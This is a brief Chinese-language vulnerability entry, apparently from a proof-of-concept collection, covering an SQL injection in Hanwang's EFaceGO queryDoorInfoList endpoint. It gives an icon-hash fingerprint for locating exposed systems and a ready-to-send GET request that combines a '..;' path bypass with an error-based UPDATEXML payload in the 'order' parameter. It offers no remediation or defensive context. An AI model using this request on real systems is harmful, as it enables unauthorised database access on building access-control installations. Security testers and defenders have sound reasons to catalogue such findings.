# 汉王EFaceGOqueryDoorInfoList存在SQL注入漏洞

汉王 ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="1380907357"`
- **请求**：`GET /manage/m/..;aa/doorInfo/queryDoorInfoList.do?page=1&pageSize=10&mtId=1&order=(UPDATEXML(2920,CONCAT(0x2e,0x71716a7071,(SELECT+(ELT(2920=2920,1))),0x71706b7671),8357)) HTTP/1.1`
- **响应特征**：200